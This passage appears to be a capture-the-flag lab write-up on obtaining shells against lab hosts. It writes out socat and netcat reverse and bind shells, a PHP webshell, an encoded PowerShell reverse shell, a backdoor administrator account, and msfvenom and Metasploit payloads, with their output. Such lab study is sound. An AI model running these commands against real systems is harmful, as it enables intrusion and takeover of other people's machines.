socat TCP:10.10.62.10:12345 -

1. Bind shell caught by listener.

pwd

/home/shell

**Create fully stable reverse shell using socat special technique.**

1. Create listener on attack host.

socat TCP-L:1234 FILE:\`tty\`,raw,echo=0

1. Create tty reverse shell on target host.

socat TCP:10.10.108.143:1234 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane

1. Fully interactive session created.

pwd

/home/shell

whoami

shell

**Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.**

1. Create new php file in attacker’s terminal.

cat > /root/Desktop/windows-php-reverse-shell.php

1. Add text to file.

\<?php echo "\<pre>" . shell\_exec($\_GET\["cmd"]) . "\</pre>"; ?>

* CTRL+C to write changes to file.

1. Upload webshell to target host.

* Browse to[ http://10.10.122.18](http://10.10.122.18/) from attacker.
* Click ‘Browse’ button.
* Navigate to /root/Desktop/windows-php-reverse-shell.php.
* Click ‘Open’ to select the file.
* Click ‘Submit’ to upload the file.

1. Create listener in attack host’s terminal.

nc -lvnp 1234

1. Verify that webshell GET parameter (cmd) is working by passing ipconfig command in attacker’s browser.

http://10.10.122.18/uploads/windows-php-reverse-shell.php?cmd=ipconfig

1. Execute Powershell in attacker’s browser by copying powershell into the URL as the cmd argument.

http://10.10.122.18/uploads/windows-php-reverse-shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.108.143%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

* Amend to the attacker’s IP address and to 1234.

1. Connection from target host received.

connection from 10.10.70.179 49827 received!

whoami

nt authority\system

PS C:\xampp\htdocs\uploads> pwd

Path

\----

C:\xampp\htdocs\uploads

Webserver is running with SYSTEM privileges. Create a new user and add it to the 'administrators' group, then login over RDP or WinRM.

1. Create a new user in the reverse shell session created in the previous task.

net user /add newadmin password

1. Add the new user to the Administrators group.

net localgroup administrators newadmin /add

1. Login over RDP using new user account.

xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.179 /u:newadmin /p:'password'

* RDP connects after acknowledging certificate CN mismatch.

Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

**Create Netcat reverse shell.**

1. Start listener on attacker.

nc -lvnp 1234

1. Create RDP session using supplied administrative credentials.

xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.179 /u:Administrator /p:'TryH4ckM3!'

1. Open command prompt on target and create bind shell.

nc 10.10.248.19 1234 -e “powershell.exe”

1. Connection established.

Connection from 10.10.70.179 50558 received!

Windows PowerShell

Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>

**Create Netcat bind shell (using existing RDP session).**

1. Open command prompt on target and create listener.

nc -lvnp 1234 -e “powershell.exe”

1. Create outbound connection from attacker.

nc 10.10.70.179 1234

1. Session is established.

* On target host.

connect to \[10.10.70.179] from (UNKNOWN) \[10.10.18.162] 50900

* On attacker host.

Windows PowerShell

Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>

**Create a socal reverse shell (using existing RDP session).**

1. Start listener in attacker.

socat TCP-L:1234 -

1. Open command prompt on target and create connection back to listener.

socat TCP:10.10.18.162:1234 EXEC:powershell.exe,pipes

1. Session established.

Windows PowerShell

Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>

**Create a socat bind shell (using existing RDP session).**

1. Create listener at command prompt of target.

socat TCP-L:1234 EXEC:powershell.exe,pipes

1. Connect to waiting listener from attacker.

socat TCP:10.10.70.179:1234 -

1. Session established.

Windows PowerShell

Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>

Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.

1. Create msfvenom payload.

msfvenom -p windows/x64/shell/reverse\_tcp -f exe -o shell.exe LHOST=10.10.248.19 LPORT=1234

1. Upload shell.exe to the target.

* Browse to[ http://10.10.70.179](http://10.10.70.179/) in attacker’s browser.
* Click ‘Browse’ button.
* Navigate to /root/shell.exe.
* Click ‘Open’ to select the file.
* Click ‘Submit’ to upload the file.

1. Create Meterpreter listener to catch the reverse shell.

* Msfconsole
* use multi/handler
* set LHOST 10.10.248.19
* set LPORT 1234
* set PAYLOAD windows/x64/meterpreter/reverse\_tcp
* run

1. Execute the shell.

* RDP to target.
* Open browser on the target.
* Browse to http://127.0.0.1/uploads.
* Save the shell.exe file.
* Run file

1. Meterpreter session is created on attacker.

\[+] Sending stage (200774 bytes) to 10.10.70.179

\[+] Meterpreter session 1 opened (10.10.248.19:1234 -> 10.10.70.179:50335) at 2024-01-11 17:35:22 +0000

Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?

**Create stageless meterpreter shell for Windows target.**

1. Create the msfvenom payload.

msfvenom -p windows/x64/shell\_reverse\_tcp -f exe -o shell2.exe LHOST=10.10.18.162 LPORT=1234

1. Upload shell2.exe to target.

* Browse to http://10.10.70.179 in attacker’s browser.
* Click ‘Browse’ button.
* Navigate to /root/shell2.exe.
* Click ‘Open’ to select the file.
* Click ‘Submit’ to upload the file.

1. Create nc listener on attacking machine.

nc -lvnp 1234

1. Execute the shell.

* RDP to the target.
* Open a browser.
* Browse to http://127.0.0.1/uploads.
* Save shell2.exe.
* Run file.

1. Session is established.

Connection from 10.10.70.179 50849 received!

Microsoft Windows \[Version 10.0.17763.1637]

(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Downloads>

**Create staged meterpreter shell for Windows target.**

1. Create the msfvenom payload.

msfvenom -p windows/x64/shell/reverse\_tcp -f exe -o shell3.exe LHOST=10.10.18.162 LPORT=1234

1. Upload shell3.exe to target server.

* Browse to http://10.10.70.179 in attacker’s browser.
* Click ‘Browse’ button.
* Navigate to /root/shell2.exe.
* Click ‘Open’ to select the file.
* Click ‘Submit’ to upload the file.

1. Create nc listener on attacking machine.

nc -lvnp 1234

1. Execute the shell.

* RDP to the target.
* Open a browser.
* Browse to http://127.0.0.1/uploads.
* Save shell3.exe.
* Run file.

1. Session established.

connection from 10.10.70.179 51018 received!
